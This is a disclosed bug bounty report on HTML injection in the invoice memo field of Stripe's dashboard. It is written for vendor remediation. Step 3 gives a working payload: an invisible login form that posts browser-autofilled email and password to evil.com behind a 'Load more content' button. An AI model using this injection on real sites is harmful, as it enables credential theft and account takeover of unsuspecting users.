# HTML Injection in the Invoice memos field

## Report Details
- **Report ID**: 1257767
- **URL**: https://hackerone.com/reports/1257767
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-12T02:58:59.290Z
- **Disclosed**: 2023-03-01T17:05:09.775Z

## Reporter
- **Username**: sn-shyk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripe

## Vulnerability Information
## Summary:

In customer invoices a memo field is vulnerable to HTML injection.  So i can takeover any victim's account with auto-save functionality through HTML injection. Basically when we saved the login credential in our browser & tried to login into the account the browser automatically fills the email & pass we just need to click on login. so I created a login form and make the email & password field invisible by setting Opacaity:0 in CSS and set my button name to "Load more content".

## Steps To Reproduce:

  1. Login to your account and save your email and password in your browser 

  2. Go to https://dashboard.stripe.com/invoices. Create new invoice or edit any invoice 

  3. Memo field is vulnerable to HTML injection. So just paid this HTML code to memo field "<form action="//evil.com" method="GET"><input type="text" name="u" style='opacity:0;'><input type="password" name="p" style='opacity:0;'><input type="submit" name="s" value="Load more content"> "

  4. Save the invoice. Now open that invoice in a new tab.

  5.  You can see a "load more content" button there. Just click on that button and in evil.com you will find your email and password in URL.

  6. You can takeover any victim's account by sending that invoice 

## Supporting Material/References:
https://saadahmedx.medium.com/exploiting-auto-save-functionality-to-steal-login-credentials-bf4c7e1594da

## Impact

Takeover any victim's account

## Attachments
- Account_takeover_via_html_injection.mp4
